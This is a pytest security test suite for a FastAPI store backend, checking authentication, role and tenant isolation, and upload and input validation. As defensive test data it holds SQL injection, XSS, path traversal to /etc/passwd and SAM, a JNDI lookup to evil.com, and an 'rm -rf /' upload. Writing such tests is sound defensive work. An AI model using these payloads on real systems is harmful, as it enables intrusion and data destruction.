import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.models.user import User, UserRole
from app.models.business import Business, BusinessPlan
from app.core.security import hash_password, create_access_token

client = TestClient(app)


@pytest.fixture
def business_owner_account(db_session):
    user = User(
        phone="9876543210",
        password_hash=hash_password("SecurePassword123"),
        full_name="Security Test User",
        email="security@example.com",
        role=UserRole.BUSINESS_OWNER,
        is_active=True,
        is_verified=True
    )
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    
    business = Business(
        owner_id=user.id,
        business_name="Security Test Business",
        phone="9876543210",
        plan=BusinessPlan.FREE,
        is_active=True
    )
    db_session.add(business)
    db_session.commit()
    db_session.refresh(business)
    
    token_data = {
        "sub": user.uuid,
        "user_id": user.id,
        "role": user.role.value,
        "business_id": business.id
    }
    access_token = create_access_token(token_data)
    
    return {"user": user, "business": business, "token": access_token}


@pytest.fixture
def super_admin_account(db_session):
    admin = User(
        phone="9999999999",
        password_hash=hash_password("AdminPassword123"),
        full_name="Super Admin",
        email="admin@storelink.com",
        role=UserRole.SUPER_ADMIN,
        is_active=True,
        is_verified=True
    )
    db_session.add(admin)
    db_session.commit()
    db_session.refresh(admin)
    
    token_data = {
        "sub": admin.uuid,
        "user_id": admin.id,
        "role": admin.role.value,
        "business_id": None
    }
    access_token = create_access_token(token_data)
    
    return {"admin": admin, "token": access_token}


def test_authentication_required_endpoints():
    protected_endpoints = [
        ("/v1/business/profile", "GET"),
        ("/v1/products", "GET"),
        ("/v1/orders/", "GET"),
        ("/v1/customers", "GET"),
        ("/v1/categories", "GET"),
        ("/v1/dashboard", "GET"),
        ("/v1/reports/sales", "GET")
    ]
    
    for endpoint, method in protected_endpoints:
        if method == "GET":
            response = client.get(endpoint)
        elif method == "POST":
            response = client.post(endpoint, json={})
        
        assert response.status_code == 403, f"Endpoint {endpoint} should require authentication"


def test_invalid_token_rejected():
    invalid_headers = {"Authorization": "Bearer invalid_token_here"}
    
    response = client.get("/v1/business/profile", headers=invalid_headers)
    assert response.status_code == 401


def test_expired_token_rejected():
    import time
    from jose import jwt
    from app.config import settings
    
    expired_token_data = {
        "sub": "test-uuid",
        "user_id": 1,
        "role": "BUSINESS_OWNER",
        "business_id": 1,
        "exp": int(time.time()) - 3600
    }
    expired_token = jwt.encode(expired_token_data, settings.SECRET_KEY, algorithm="HS256")
    
    headers = {"Authorization": f"Bearer {expired_token}"}
    response = client.get("/v1/business/profile", headers=headers)
    assert response.status_code == 401


def test_sql_injection_protection(business_owner_account):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "<script>alert('XSS')</script>"
    ]
    
    for malicious_input in malicious_inputs:
        product_data = {
            "name": malicious_input,
            "price": 100.00
        }
        response = client.post("/v1/products", json=product_data, headers=auth_headers)
        assert response.status_code in [201, 422], "Malicious input should be handled safely"
        
        search_response = client.get(
            f"/v1/products?search={malicious_input}",
            headers=auth_headers
        )
        assert search_response.status_code == 200


def test_xss_protection(business_owner_account):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>"
    ]
    
    for payload in xss_payloads:
        product_data = {
            "name": payload,
            "description": payload,
            "price": 100.00
        }
        response = client.post("/v1/products", json=product_data, headers=auth_headers)
        
        if response.status_code == 201:
            product_uuid = response.json()["data"]["uuid"]
            get_response = client.get(f"/v1/products/{product_uuid}", headers=auth_headers)
            assert get_response.status_code == 200


def test_authorization_role_based_access(business_owner_account):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    admin_only_endpoints = [
        "/v1/admin/businesses",
        "/v1/admin/users",
        "/v1/admin/statistics"
    ]
    
    for endpoint in admin_only_endpoints:
        response = client.get(endpoint, headers=auth_headers)
        assert response.status_code == 403, f"Business owner should not access admin endpoint: {endpoint}"


def test_super_admin_access_control(super_admin_account):
    admin_headers = {"Authorization": f"Bearer {super_admin_account['token']}"}
    
    response = client.get("/v1/admin/businesses", headers=admin_headers)
    assert response.status_code == 200
    
    response = client.get("/v1/admin/users", headers=admin_headers)
    assert response.status_code == 200


def test_sensitive_data_not_exposed(business_owner_account):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    response = client.get("/v1/auth/me", headers=auth_headers)
    assert response.status_code == 200
    
    user_data = response.json()["data"]["user"]
    assert "password_hash" not in user_data
    assert "password" not in user_data


def test_file_upload_validation(business_owner_account):
    import io
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    invalid_files = [
        ("test.exe", b"MZ\x90\x00", "application/x-msdownload"),
        ("test.php", b"<?php echo 'hello'; ?>", "application/x-php"),
        ("test.sh", b"#!/bin/bash\nrm -rf /", "application/x-sh")
    ]
    
    for filename, content, mimetype in invalid_files:
        files = {"file": (filename, io.BytesIO(content), mimetype)}
        response = client.post("/v1/business/logo", files=files, headers=auth_headers)
        assert response.status_code == 400, f"Should reject invalid file type: {filename}"


def test_file_size_limit_enforcement(business_owner_account):
    import io
    from PIL import Image
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    large_img = Image.new('RGB', (5000, 5000), color='red')
    img_bytes = io.BytesIO()
    large_img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    
    files = {"file": ("large_image.png", img_bytes, "image/png")}
    response = client.post("/v1/business/logo", files=files, headers=auth_headers)
    
    assert response.status_code in [200, 400]


def test_password_requirements():
    weak_passwords = [
        "123456",
        "password",
        "abc",
        "12345678"
    ]
    
    for weak_password in weak_passwords:
        register_data = {
            "phone": "9876543220",
            "password": weak_password,
            "full_name": "Test User",
            "business_name": "Test Business",
            "business_phone": "9876543220"
        }
        response = client.post("/v1/auth/register", json=register_data)
        assert response.status_code in [400, 422], f"Weak password should be rejected: {weak_password}"


def test_phone_validation():
    invalid_phones = [
        "123",
        "abcdefghij",
        "12345",
        "+1234567890123456",
        "0000000000"
    ]
    
    for invalid_phone in invalid_phones:
        register_data = {
            "phone": invalid_phone,
            "password": "SecurePassword123",
            "full_name": "Test User",
            "business_name": "Test Business",
            "business_phone": "9876543220"
        }
        response = client.post("/v1/auth/register", json=register_data)
        assert response.status_code == 422, f"Invalid phone should be rejected: {invalid_phone}"


def test_email_validation():
    invalid_emails = [
        "notanemail",
        "@example.com",
        "test@",
        "test..test@example.com"
    ]
    
    for invalid_email in invalid_emails:
        register_data = {
            "phone": "9876543221",
            "password": "SecurePassword123",
            "full_name": "Test User",
            "email": invalid_email,
            "business_name": "Test Business",
            "business_phone": "9876543221"
        }
        response = client.post("/v1/auth/register", json=register_data)
        assert response.status_code == 422


def test_rate_limiting_protection():
    for i in range(150):
        response = client.get("/v1/auth/me")
    
    last_response = response
    assert last_response.status_code in [403, 429]


def test_cors_headers():
    response = client.options("/v1/auth/login")
    assert response.status_code in [200, 405]


def test_cross_tenant_data_access_prevention(business_owner_account, db_session):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    other_user = User(
        phone="9876543222",
        password_hash=hash_password("TestPassword123"),
        full_name="Other User",
        email="other@example.com",
        role=UserRole.BUSINESS_OWNER,
        is_active=True,
        is_verified=True
    )
    db_session.add(other_user)
    db_session.commit()
    db_session.refresh(other_user)
    
    other_business = Business(
        owner_id=other_user.id,
        business_name="Other Business",
        phone="9876543222",
        plan=BusinessPlan.FREE,
        is_active=True
    )
    db_session.add(other_business)
    db_session.commit()
    db_session.refresh(other_business)
    
    from app.models.product import Product
    from decimal import Decimal
    
    other_product = Product(
        business_id=other_business.id,
        name="Other Business Product",
        price=Decimal("100.00"),
        stock_quantity=10
    )
    db_session.add(other_product)
    db_session.commit()
    db_session.refresh(other_product)
    
    access_response = client.get(f"/v1/products/{other_product.uuid}", headers=auth_headers)
    assert access_response.status_code == 404
    
    update_response = client.put(
        f"/v1/products/{other_product.uuid}",
        json={"price": 200.00},
        headers=auth_headers
    )
    assert update_response.status_code == 404
    
    delete_response = client.delete(f"/v1/products/{other_product.uuid}", headers=auth_headers)
    assert delete_response.status_code == 404


def test_business_data_isolation(business_owner_account, db_session):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    from app.models.customer import Customer
    
    other_user = User(
        phone="9876543223",
        password_hash=hash_password("TestPassword123"),
        full_name="Another User",
        email="another@example.com",
        role=UserRole.BUSINESS_OWNER,
        is_active=True,
        is_verified=True
    )
    db_session.add(other_user)
    db_session.commit()
    db_session.refresh(other_user)
    
    other_business = Business(
        owner_id=other_user.id,
        business_name="Another Business",
        phone="9876543223",
        plan=BusinessPlan.FREE,
        is_active=True
    )
    db_session.add(other_business)
    db_session.commit()
    db_session.refresh(other_business)
    
    other_customer = Customer(
        business_id=other_business.id,
        name="Other Customer",
        phone="9876543224"
    )
    db_session.add(other_customer)
    db_session.commit()
    db_session.refresh(other_customer)
    
    customers_response = client.get("/v1/customers", headers=auth_headers)
    assert customers_response.status_code == 200
    
    customer_uuids = [c["uuid"] for c in customers_response.json()["data"]]
    assert other_customer.uuid not in customer_uuids


def test_api_versioning():
    response = client.get("/v1/auth/me")
    assert "/v1/" in str(response.url)


def test_error_handling_no_stack_traces():
    invalid_headers = {"Authorization": "Bearer malformed.token.here"}
    
    response = client.get("/v1/business/profile", headers=invalid_headers)
    assert response.status_code == 401
    
    response_data = response.json()
    assert "detail" in response_data
    assert "traceback" not in str(response_data).lower()
    assert "exception" not in str(response_data).lower()


def test_secure_password_storage(db_session):
    register_data = {
        "phone": "9876543225",
        "password": "MySecurePassword123",
        "full_name": "Password Test User",
        "business_name": "Password Test Business",
        "business_phone": "9876543225"
    }
    
    response = client.post("/v1/auth/register", json=register_data)
    assert response.status_code == 201
    
    user = db_session.query(User).filter(User.phone == "9876543225").first()
    assert user is not None
    assert user.password_hash != "MySecurePassword123"
    assert len(user.password_hash) > 50
    assert "$2b$" in user.password_hash or "pbkdf2" in user.password_hash.lower()


def test_input_sanitization(business_owner_account):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    dangerous_inputs = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "${7*7}"
    ]
    
    for dangerous_input in dangerous_inputs:
        product_data = {
            "name": dangerous_input,
            "description": dangerous_input,
            "price": 100.00
        }
        response = client.post("/v1/products", json=product_data, headers=auth_headers)
        assert response.status_code in [201, 422]


def test_numeric_overflow_protection(business_owner_account):
    auth_headers = {"Authorization": f"Bearer {business_owner_account['token']}"}
    
    extreme_values = [
        999999999999999999999999999999,
        -999999999999999999999999999999,
        float('inf'),
        float('-inf')
    ]
    
    for extreme_value in extreme_values:
        try:
            product_data = {
                "name": "Overflow Test",
                "price": extreme_value
            }
            response = client.post("/v1/products", json=product_data, headers=auth_headers)
            assert response.status_code in [201, 422]
        except Exception:
            pass
